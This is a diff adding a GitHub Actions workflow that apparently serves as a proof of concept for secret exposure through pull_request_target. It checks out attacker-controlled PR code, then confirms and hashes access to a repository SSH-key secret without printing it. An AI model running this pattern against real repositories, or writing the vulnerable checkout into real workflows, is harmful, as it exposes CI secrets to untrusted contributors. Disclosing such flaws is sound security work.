@@ -1,0 +1,36 @@
+name: PR Secret Exposure PoC
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+
+    steps:
+      # ⚠️ Vulnerable pattern: checkout attacker-controlled code
+      - name: Checkout PR code (attacker-controlled)
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      # ✅ PoC: prove secret is accessible
+      - name: PoC – Secret access verification
+        run: |
+          echo "[+] Running in pull_request_target context"
+          echo "[+] This is attacker-controlled PR code"
+
+          if [ -z "${{ secrets.BITBUCKET_E2E_TEST_PUB_SSH_KEY }}" ]; then
+            echo "❌ Secret NOT available"
+            exit 1
+          else
+            echo "✅ Secret IS available to PR code"
+          fi
+
+      # ✅ Strong proof: transform secret without printing it
+      - name: PoC – Secret usage proof (hash)
+        run: |
+          echo "[+] Deriving hash from secret (value never printed)"
+          HASH=$(echo -n "${{ secrets.BITBUCKET_E2E_TEST_PUB_SSH_KEY }}" | sha256sum | cut -d' ' -f1)
+          echo "✅ Secret successfully processed"
